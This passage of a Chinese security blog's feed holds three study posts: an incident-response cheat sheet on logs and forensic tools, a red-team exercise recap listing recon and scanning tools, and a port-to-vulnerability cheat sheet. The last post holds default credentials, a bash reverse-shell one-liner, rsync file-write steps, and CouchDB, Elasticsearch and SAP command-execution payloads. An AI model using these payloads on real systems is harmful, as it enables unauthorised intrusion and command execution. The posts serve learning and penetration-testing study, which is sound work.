服务器或者矿地址池等操作的时候，可监控到是哪个进程发起的连接，并找到对应程序所在目录进行清理操作。</td></tr><tr><td>Event ID 11</td><td>文件创建事件，创建或覆盖文件时，这些创建操作会被记录下来。此事件对于监控自动启动位置，如启动文件夹目录、临时目录、下载目录非常有用.，而这些目录正是初始感染阶段恶意运行要用到的目录</td></tr><tr><td>Event ID 22</td><td>记录 DNS 查询，容易受该功能影响的一种场景就是基于 DNS 的 C2 通信，其中大量请求会被记录下来</td></tr></tbody></table><p><strong>威胁分析平台</strong></p><p><strong>BeaconEye</strong><br>监测CS木马后门特征</p><p><strong>DumpIt</strong><br>内存取证工具，需要dump整个系统，取证空间占用太大，不建议使用<br>替代工具:<code>FTK Imager</code>和<code>WinPMem</code></p><p><strong>Volatility</strong><br>内存取证工具</p><h4 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h4><p>windows主要有以下三类日志记录系统事件: 系统日志、安全日志、应用程序日志</p><pre><code>打开方式:1、开始 -&gt; 运行 -&gt; eventvwr2、开始-&gt; 管理工具 -&gt; 事件查看 -&gt; 安全</code></pre><p><strong>系统日志</strong><br>默认位置:%SystemRoot%System32WinevtLogsSystem.evtx</p><table><thead><tr><th>事件</th><th>ID</th></tr></thead><tbody><tr><td>系统启动</td><td>6005</td></tr><tr><td>事件日志服务已启动</td><td>6006</td></tr><tr><td>事件日志服务已停止</td><td>12</td></tr><tr><td>系统关闭</td><td>13</td></tr></tbody></table><p><strong>安全日志</strong><br>%SystemRoot%System32WinevtLogsSecurity.evtx<br>注意：不同版本的系统日志ID可能不同，建议自行查找<br><a href="https://smms.app/image/ZjJkrGV3hI9zd5i" target="_blank"><img src="https://s2.loli.net/2023/07/28/ZjJkrGV3hI9zd5i.png" width="400"></a></p><p><strong>应用程序日志</strong><br>%SystemRoot%System32WinevtLogsApplication.evtx</p><h3 id="Linux应急响应"><a href="#Linux应急响应" class="headerlink" title="Linux应急响应"></a>Linux应急响应</h3><h4 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h4><p><strong><code>top</code>和<code>ps -aux</code></strong><br>查看系统资源占用</p><p><strong><code>netstat -antpl</code></strong><br>查看网络连接以及其对应可执行程序</p><p><strong>lsof</strong><br>查看开放端口的进程</p><p><strong>登录信息查看</strong><br>显示错误的尝试登录信息: lastb<br>显示系统用户最近的登录信息: last<br>现实所有的用户最近的登录信息: lastlog</p><p><strong>grep</strong><br>查找符合条件的字符串:netstat -antpl lgrep 22</p><p><strong>crontab</strong><br>查看定时任务: crontab -1 、 cat /etc/crontab</p><p><strong>历史命令</strong><br>查看历史命令: history、cat ~/.bash history</p><p><strong>校验RPM软件包</strong><br>校验RPM软件包: rpm -Va、dpkg -verify<br>S：表示对应文件的大小 (Size) 不一致<br>M: 表示对于文件的mode不一致<br>5:表示对应文件的MD5不一致<br>D:表示文件的major和minor号不一致<br>L:表示文件的符号连接内容不一致<br>U:表示文件的owner不一致<br>G: 表示文件的group不一致<br>T:表示文件的修改时间不一致</p><p><strong>其它</strong><br>登录成功的IP<br>grep “Accepted” /var/log/secure | awk ‘{print $11}’ | sort | uniq -c | sort -nr | more<br>定位有爆破行为的IP<br>grep “Failed password” /var/log/secure awk ‘{print $11}’ | sort | uniq -c | sort -nr | more<br>查看隐藏进程<br>ps -ef  awk ‘{print $11}’ | sort -n | uniq &gt;1<br>ls /proc | sort -n | uniq &gt;2<br>diff 1 2</p><h4 id="应急工具"><a href="#应急工具" class="headerlink" title="应急工具"></a>应急工具</h4><p><strong>BusyBox</strong><br>静态链接库的BusyBox<br>当命令被替换时使用<br>赋予可执行权限后.\即可</p><p><strong>chkrootkit</strong><br>监测RootKit的脚本</p><p><strong>Rkhunter</strong><br>同上</p><p><strong>unhide</strong><br>查找隐藏的UDP/TCP进程</p><p><strong>ClamAV</strong><br>检测各种恶意木马，病毒，进程<br>注意是否存在so文件的注入</p><p><strong>河马Webshell</strong></p><h4 id="Web日志分析"><a href="#Web日志分析" class="headerlink" title="Web日志分析"></a>Web日志分析</h4><p><a href="https://smms.app/image/PT3z2eDRXrnEfFA" target="_blank"><img src="https://s2.loli.net/2023/07/28/PT3z2eDRXrnEfFA.png" width="400"></a></p><p><a href="https://smms.app/image/QRHjtKZ7Ulh25iW" target="_blank"><img src="https://s2.loli.net/2023/07/28/QRHjtKZ7Ulh25iW.png" width="400"></a></p><p><a href="https://smms.app/image/uS1eGAtZMsj3p2n" target="_blank"><img src="https://s2.loli.net/2023/07/28/uS1eGAtZMsj3p2n.png" width="400"></a></p><p><a href="https://smms.app/image/j3QUfAiM6x1aJOR" target="_blank"><img src="https://s2.loli.net/2023/07/28/j3QUfAiM6x1aJOR.png" width="400"></a></p><p><strong>查找文件中的恶意/危险函数</strong></p><pre><code>PHP: eval(、system(、assert (JSP: getRunTime(、FileOutputStream(ASP: eval(、execute(、ExecuteGlobal (</code></pre><p><strong>从日志记录中查找</strong><br>查看每个 IP 地址访问次数:<br>cat access.log |awk ‘{print $1}’ |sort|uniq - c<br>访问URL排序:<br>cat access.log |awk ‘{print $1}’ |sort|uniq - c |sort -rn|head<br>访问指定资源日志:<br>cat access.log |awk ‘{print $7}’ |grep /%25Domain |sort|uniq - c |sort -rn|more</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;应急响应概述&quot;&gt;&lt;a href=&quot;#应急响应概述&quot; class=&quot;headerlink&quot; title=&quot;应急响应概述&quot;&gt;&lt;/a&gt;应急响应概述&lt;/h3&gt;&lt;h4 id=&quot;应急响应流程&quot;&gt;&lt;a href=&quot;#应急响应流程&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>红队总结</title>
    <link href="https://liu1272.github.io/2023/07/13/%E7%BA%A2%E9%98%9F%E6%80%BB%E7%BB%93/"/>
    <id>https://liu1272.github.io/2023/07/13/%E7%BA%A2%E9%98%9F%E6%80%BB%E7%BB%93/</id>
    <published>2023-07-13T12:26:00.000Z</published>
    <updated>2023-07-19T13:17:36.757Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>这次参加的是广州市的护网红队，跟着师兄一起去的，我一个大一的玩意就不指望能拿shell啥的了。<br>虽然结果排名不高，但是队员们很努力。</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><strong>准备</strong><br>首先的话会有提供靶标和虚拟机给你使用，这些机子在上交报告和复现都要用到，其他时候也要挂着VPN。</p><p><strong>信息收集</strong></p><ul><li>先用enscan收集一下企业资产</li><li>使用搜索引擎搜索官网</li><li>在官网上看看各个功能</li><li>使用Wappalyzer查看网站的框架</li><li>用findsomething插件、Find-SomeThing脚本、jjjjjjjjjjjjjs脚本看网页JS信息泄露</li><li>识别git/svn泄露（实在太少而且难以利用）</li><li>使用EHole指纹识别</li><li>dirsearch或者御剑扫描目录，线程不要太高，时间够的不用急</li><li>nmap或者masscan扫端口</li><li><a href="https://rapiddns.io/subdomain">网站1</a>、<a href="https://www.dnsgrep.cn/subdomain/">网站2</a>收集子域名</li><li><a href="https://ping.chinaz.com/">多地点Ping</a>查看真实ip</li><li>zoomeye和shodan根据ip查找（感觉这样子更加准确）</li><li>肉眼分析框架（网上的工具不太会用，手工分析更加方便）</li></ul><p><strong>利用工具检测漏洞</strong></p><ol><li>apt_tools</li><li>LiqunKit</li><li>nuclei</li><li>shiro_attack</li><li>SpringBoot-Scan</li><li>Wpscan</li><li>ThinkphpGUI</li><li>Xray</li><li>神机综合利用工具</li><li>unauthorizedV2未授权检测</li><li>wafw00f识别</li></ol><p><strong>手动检测漏洞</strong></p><ol><li>弱口令爆破</li><li>网页跳转间隔进行未授权访问</li><li>重新审计JS文件寻找未授权</li><li>注册用户文件上传</li><li>更改密码逻辑漏洞</li><li>路径穿越，任意文件读取</li><li>sql注入（渗透中是中危，但是护网中不拿shell、密码或者重要数据的话分数较少）</li><li>伪造token/cookie</li></ol><p><strong>最后</strong><br>收集数据，填写报告上交审核，不过就扯嘴皮。</p><h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>因为我们队实力不算很好，还有我这个摸鱼的，所以也没学到特别多的东西，希望以后能跟着大佬一起学习吧。<br>护网的时候拿分应该是有诀窍的，但是俺不知道。<br>信息泄露那成百上千万条估计是个大头，以后红队多注重这方面。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;这次参加的是广州市的护网红队，跟着师兄一起去的，我一个大一的玩意就不指望能拿shell啥的了。&lt;br&gt;虽然结果排名不高，但是队员们很努力。&lt;</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
  <entry>
    <title>常见的端口和对应的服务</title>
    <link href="https://liu1272.github.io/2023/07/12/%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AB%AF%E5%8F%A3%E5%92%8C%E5%AF%B9%E5%BA%94%E7%9A%84%E6%9C%8D%E5%8A%A1/"/>
    <id>https://liu1272.github.io/2023/07/12/%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AB%AF%E5%8F%A3%E5%92%8C%E5%AF%B9%E5%BA%94%E7%9A%84%E6%9C%8D%E5%8A%A1/</id>
    <published>2023-07-12T12:07:00.000Z</published>
    <updated>2023-07-19T07:32:29.797Z</updated>
    
    <content type="html"><![CDATA[<h4 id="web类"><a href="#web类" class="headerlink" title="web类"></a>web类</h4><p><strong>struts2：</strong><br>太多，略……</p><p><strong>thinkphp：</strong><br><a href="https://smms.app/image/AtUjGFfCBWR9mxz" target="_blank"><img src="https://s2.loli.net/2023/07/19/AtUjGFfCBWR9mxz.png" ></a></p><p><strong>jboss：</strong><br><a href="https://smms.app/image/1sElFjNxyCQTUdw" target="_blank"><img src="https://s2.loli.net/2023/07/19/1sElFjNxyCQTUdw.png" ></a></p><p><strong>ganglia：</strong><br>CVE-2007-6465: 多个跨站脚本攻击漏洞<br>CVE-2012-3448: 未明PHP代码执行漏洞<br>8649端口未授权访问: 通过http协议获取相关监控的xml信息<br>nmap扫描脚本  <code>nmap --script ganglia-info --script-args ganglia-info.timeout=60,ganglia-info.bytes=100000 -p</code></p><p><strong>zabbix：</strong><br>弱口令/默认账号: </p><pre><code>admin:zabbixAdmin:zabbixguest: 空</code></pre><p>ave-2016-10134: sql注入<br>系统命令执行: 管理员登录后Administrator-script-createscript</p><pre><code>bash -i &gt;&amp; /dev/tcp/ip/端口 0&gt;&amp;1</code></pre><h4 id="数据库类（扫描弱口令）"><a href="#数据库类（扫描弱口令）" class="headerlink" title="数据库类（扫描弱口令）"></a>数据库类（扫描弱口令）</h4><p><strong>MSSQL</strong></p><pre><code>默认端口：1433（Server 数据库服务）、1434（Monitor 数据库监控）攻击方法：    爆破：弱口令/使用系统用户    注入参考：    https://www.anquanke.com/post/id/86011</code></pre><p><strong>Oracle</strong></p><pre><code>默认端口：1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务）攻击方法：    爆破：弱口令    注入攻击；    漏洞攻击；    -参考：    https://www.leiphone.com/news/201711/JjzXFp46zEPMvJod.html</code></pre><p><strong>MySQL</strong></p><pre><code>默认端口：3306攻击方法：    爆破：弱口令    身份认证漏洞：CVE-2012-2122    拒绝服务攻击    Phpmyadmin万能密码绕过：用户名：‘localhost’@’@” 密码任意    提权参考：    https://www.seebug.org/appdir/MySQL    http://www.waitalone.cn/mysql-tiquan-summary.html?replytocom=390    https://xz.aliyun.com/t/1491</code></pre><p><strong>PostgreSQL</strong></p><pre><code>默认端口：5432攻击方法：    爆破：弱口令：postgres postgres    缓冲区溢出：CVE-2014-2669参考：    http://drops.xmd5.com/static/drops/tips-6449.html    https://www.secpulse.com/archives/69153.html</code></pre><p><strong>MongoDB</strong></p><pre><code>默认端口：27017攻击方法：    爆破：弱口令    未授权访问；github有攻击代码；请点击参考：    http://www.cnblogs.com/LittleHann/p/6252421.html    http://www.tiejiang.org/19157.html</code></pre><p><strong>Redis</strong></p><pre><code>攻击方法：    爆破：弱口令    未授权访问+配合ssh key提权；参考：    http://www.alloyteam.com/2017/07/12910/</code></pre><p><strong>SysBase</strong></p><pre><code>默认端口：服务端口5000；监听端口4100；备份端口：4200攻击方法：    爆破：弱口令    命令注入：</code></pre><p><strong>DB2</strong></p><pre><code>默认端口：5000攻击方法：    安全限制绕过：成功后可执行未授权操作（CVE-2015-1922）参考：    http://23.94.222.93/bug_detail.php?wybug_id=wooyun-2015-0113071</code></pre><h4 id="特殊服务类（未授权-命令执行-漏洞）"><a href="#特殊服务类（未授权-命令执行-漏洞）" class="headerlink" title="特殊服务类（未授权/命令执行/漏洞）"></a>特殊服务类（未授权/命令执行/漏洞）</h4><p><strong>443 SSL心脏滴血</strong><br>该落地是一个出现在加密程序库OpenSSL的安全漏洞，该程序库广泛用于实现互联网的传输层安全（TLS）协议。<br>攻击原理是在实现TLS的心跳扩展时没有对输入进行适当验证（缺少边界检查），导致可以读取的数据比应该允许读取的还多。<br>利用该漏洞，攻击者可以远程读取服务器内存中64K的数据，获取内存中的敏感信息。</p><p><strong>873 Rsync未授权</strong><br>rsync是Linux/Unix下的一个远程数据同步工具，可通过LAN/WAN快速同步多台主机间的文件和目录。<br>由于配置不当，导致任何人可未授权访问rsync，上传本地文件，下载服务器文件。</p><pre><code>【列目录】rsync --port=xxx ip::rsync rsync://192.168.241.142:873/【看目录】rsync --port=xxx ip::目录名rsync rsync://192.168.241.142:873/src/【文件下载】rsync --port=xxx ip::目录名 ./rsync -av rsync://192.168.241.142:873/src/etc/passwd ./【文件写入】rsync -av muma.txt rsync://192.168.241.142:873/src/target.txt利用文件上传设置计划任务来反弹shell</code></pre><p><strong>5984 CouchDB未授权</strong></p><p>CVE-2017-12635权限绕过：到/_utils 目录下验证登陆,后续使用反弹shell进行进一步利用</p><pre><code>PUT /_users/org.couchdb.user:vulhub&#123;  &quot;type&quot;: &quot;user&quot;,  &quot;name&quot;: &quot;vulhub&quot;,  &quot;roles&quot;: [&quot;_admin&quot;],  &quot;roles&quot;: [],  &quot;password&quot;: &quot;vulhub&quot;&#125;</code></pre><p><strong>6379 redis未授权</strong><br><code>./redis-cli -h ip</code>  直接连接就行了</p><p><strong>7001、7002 weblogic默认弱口令、反序列化</strong></p><pre><code>【登录页面】http://ip:7001/console/login/LoginForm.jsp【默认密码】weblogic Oracle@123【反序列化漏洞】http://ip:7001/_async/AsyncResponseService</code></pre><p><strong>9200、9300 ElasticSearch未授权、命令执行漏洞</strong></p><pre><code>【未授权】http://localhost:9200/rvier/search 查看敏感信息了 http://localhost:9200/_plugin/head/ web管理界面 http://localhost:9200/_cat/indices 查看所有的index http://localhost:9200/river/search 查看数据库敏感信息 http://localhost:9200/_nodes 查看节点数据【命令执行】POST /_search?pretty HTTP/1.1&#123;    &quot;size&quot;: 1,    &quot;query&quot;: &#123;      &quot;filtered&quot;: &#123;        &quot;query&quot;: &#123;          &quot;match_all&quot;: &#123;          &#125;        &#125;      &#125;    &#125;,    &quot;script_fields&quot;: &#123;        &quot;command&quot;: &#123;            &quot;script&quot;: &quot;import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\&quot;id\&quot;).getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next();&quot;        &#125;    &#125;&#125;    &#125;&#125;</code></pre><p><strong>11211 memcache未授权访问</strong><br><code>telnet ip port</code> 直接连接</p><p><strong>50000 SAP命令执行</strong></p><pre><code>https://XXX/ctc/servlet/ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=id</code></pre><p><strong>50070、50030 hadoop默认端口未授权访问</strong></p><pre><code>http://ip:port/cluster后续上传文件反弹shell利用</code></pre><h4 id="常见的端口漏洞"><a href="#常见的端口漏洞" class="headerlink" title="常见的端口漏洞"></a>常见的端口漏洞</h4><table><thead><tr><th>端口</th><th>服务</th><th>描述</th></tr></thead><tbody><tr><td>21</td><td>ftp</td><td>FTP服务端，存在匿名未授权访问和爆破风险</td></tr><tr><td>22</td><td>ssh</td><td>SSH服务端，存在root密码爆破和后门用户的风险</td></tr><tr><td>23</td><td>telnet</td><td>Telnet服务端，常见于路由器、交换机和嵌入式设备，存在弱口令风险</td></tr><tr><td>25</td><td>smtp</td><td>SMTP服务端，可能存在默认用户和默认密码，需要防止邮件账号爆破</td></tr><tr><td>80</td><td>http</td><td>HTTP Web服务，常见的漏洞包括中间件反序列化、FastCGI配置不当等</td></tr><tr><td>110</td><td>pop3</td><td>POP3服务端，可能存在默认用户和默认密码，需要防止邮件账号爆破</td></tr><tr><td>443</td><td>https</td><td>HTTPS服务端，可能受影响的漏洞包括OpenSSL的心脏滴血和SSL/TLS低版本漏洞</td></tr><tr><td>135</td><td>netbios smb</td><td>NetBIOS SMB服务，可能受到MS17010漏洞的威胁</td></tr><tr><td>139</td><td>netbios smb</td><td>NetBIOS SMB服务，可能受到MS17010漏洞的威胁</td></tr><tr><td>445</td><td>netbios smb</td><td>NetBIOS SMB服务，可能受到MS17010漏洞的威胁</td></tr><tr><td>3389</td><td>RDP</td><td>RDP服务，可能受CVE-2019-0708漏洞的影响</td></tr></tbody></table><h4 id="汇总"><a href="#汇总" class="headerlink" title="汇总"></a>汇总</h4><table><thead><tr><th>端口</th><th>对应的服务</th><th>存在的相关漏洞</th></tr></thead><tbody><tr><td>21/69</td><td>ftp/tftp：文件传输协议</td><td>爆破,嗅探溢出,后门,匿名访问</td></tr><tr><td>22</td><td>ssh</td><td>爆破,openssh漏洞</td></tr><tr><td>23</td><td>telnet：远程连接</td><td>爆破嗅探</td></tr><tr><td>25</td><td>smtp：邮件服务</td><td>弱口令,未授权访问,邮件伪造</td></tr><tr><td>53</td><td>dns：域名系统</td><td>dns区域传输,劫持,缓存投毒,隧道技术刺透防火墙</td></tr><tr><td>80/8080</td><td>apache/tomcat/nginx/axis2</td><td>爆破弱口令,http慢速攻击,解析漏洞</td></tr><tr><td>80/443/8080</td><td>web</td><td>常见web攻击,控制台爆破,对应服务器版本漏洞</td></tr><tr><td>80/81/443</td><td>IIS</td><td>put写文件,短文件名漏洞,解析漏洞</td></tr><tr><td>110</td><td>pop3</td><td>弱口令</td></tr><tr><td>123</td><td>ntp</td><td>ntp放大攻击</td></tr><tr><td>137/139</td><td>samba</td><td>爆破,未授权访问,远程代码执行</td></tr><tr><td>143</td><td>imap</td><td>弱口令</td></tr><tr><td>1521</td><td>oracle</td><td>爆破注入攻击</td></tr><tr><td>161</td><td>snmp</td><td>爆破</td></tr><tr><td>389</td><td>ladp</td><td>注入攻击,未授权访问,爆破</td></tr><tr><td>443</td><td>https</td><td>心脏滴血</td></tr><tr><td>445</td><td>smb</td><td>溢出漏洞</td></tr><tr><td>512</td><td>linux r</td><td>rlogin远程登录</td></tr><tr><td>873</td><td>rsync</td><td>未授权访问</td></tr><tr><td>1080</td><td>socket</td><td>爆破:进行内网渗透</td></tr><tr><td>1098</td><td>javarmi</td><td>命令执行</td></tr><tr><td>1352</td><td>lotus</td><td>爆破信息泄露跨站脚本攻击</td></tr><tr><td>1433</td><td>mssql</td><td>爆破,注入攻击</td></tr><tr><td>2049</td><td>nfs</td><td>未授权访问</td></tr><tr><td>2181</td><td>zookeeper</td><td>未授权访问</td></tr><tr><td>2222</td><td>da</td><td>da虚拟主机</td></tr><tr><td>2601</td><td>zebra</td><td>默认密码</td></tr><tr><td>3128</td><td>squid</td><td>空口令</td></tr><tr><td>3306</td><td>mysql</td><td>漏洞：爆破,拒绝服务,注入</td></tr><tr><td>3389</td><td>rdp/windows远程连接</td><td>爆破,shift后门,3389漏洞攻击</td></tr><tr><td>4100</td><td>sysbase</td><td>弱口令</td></tr><tr><td>4440</td><td>rundeck</td><td>弱口令</td></tr><tr><td>4848</td><td>glassfish</td><td>爆破认证绕过</td></tr><tr><td>5000</td><td>sybase/db2</td><td>弱口令命令,注入</td></tr><tr><td>5422</td><td>postgresql</td><td>弱口令</td></tr><tr><td>5432</td><td>postgresql</td><td>缓冲区溢出,注入攻击,爆破</td></tr><tr><td>5632</td><td>pcanywhere</td><td>拒绝服务,代码执行</td></tr><tr><td>5900</td><td>vnc</td><td>爆破,认证口令绕过,拒绝服务攻击,权限提升</td></tr><tr><td>5984</td><td>couchdb</td><td>命令执行</td></tr><tr><td>6082</td><td>varnish</td><td>未授权访问</td></tr><tr><td>6379</td><td>redis</td><td>弱口令,未授权访问</td></tr><tr><td>7001</td><td>weblofic</td><td>爆破,弱口令(system/system,weblogic/weblogic),congsole后台部署webshell,java反序列化泄漏源代码/列目录,ssrf窥探内网,命令执行</td></tr><tr><td>8000</td><td>jdwp</td><td>命令执行</td></tr><tr><td>8069</td><td>zabbix</td><td>命令执行</td></tr><tr><td>8080</td><td>apache/tomcat/nginx/axis2/jboss中间件</td><td>弱口令命令执行</td></tr><tr><td>8080</td><td>jboss,其他端口：1098/1099/4444/4445/8080/8009/8083/8093</td><td>爆破,远程代码执行,java反序列化</td></tr><tr><td>8080</td><td>glassfish,其他端口：iiop：3700；控制台：4848</td><td>爆破,任意文件读取,认证绕过</td></tr><tr><td>8080</td><td>resin</td><td>目录遍历,远程代码执行</td></tr><tr><td>8080/8089</td><td>jenkis</td><td>爆破,未授权访问,反序列化</td></tr><tr><td>8080</td><td>jetty</td><td>远程共享,缓冲区溢出</td></tr><tr><td>8161</td><td>activemq</td><td>文件上传</td></tr><tr><td>8649</td><td>ganglia</td><td>未授权访问,信息泄露</td></tr><tr><td>8980</td><td>opennms</td><td>反序列化漏洞</td></tr><tr><td>9080</td><td>websphere</td><td>弱口令,反序列化,文件泄露</td></tr><tr><td>9090</td><td>websphere</td><td>控制台爆破,反序列化java</td></tr><tr><td>9200/9300</td><td>elasticsearch</td><td>远程代码执行,未授权访问</td></tr><tr><td>11211</td><td>memcache</td><td>未授权访问</td></tr><tr><td>11211</td><td>memcacache</td><td>未授权访问</td></tr><tr><td>27017</td><td>mongodb</td><td>未授权访问</td></tr><tr><td>27017</td><td>mongodb</td><td>爆破,未授权</td></tr><tr><td>27018</td><td>mongodb</td><td>未授权</td></tr><tr><td>50000</td><td>sap</td><td>命令执行</td></tr><tr><td>50010</td><td>hadoop</td><td>信息泄露命令执行</td></tr><tr><td>50030</td><td>hadoop</td><td>未授权访问</td></tr><tr><td>50070</td><td>hadoop</td><td>未授权访问</td></tr><tr><td>512/513/514</td><td>linux r</td><td>直接使用rlogin</td></tr><tr><td>67/68</td><td>dhcp</td><td>劫持欺骗</td></tr></tbody></table><p><strong>注意：端口可能会被更改或隐藏以达到防御目的</strong><br><strong>这个时候就需要进行端口爆破</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;web类&quot;&gt;&lt;a href=&quot;#web类&quot; class=&quot;headerlink&quot; title=&quot;web类&quot;&gt;&lt;/a&gt;web类&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;struts2：&lt;/strong&gt;&lt;br&gt;太多，略……&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;thinkphp：&lt;/</summary>
      
    
    
    
    <category term="日报" scheme="https://liu1272.github.io/categories/%E6%97%A5%E6%8A%A5/"/>
    
    
    <category term="日报" scheme="https://liu1272.github.io/tags/%E6%97%A5%E6%8A%A5/"/>
    
  </entry>
  
</feed>
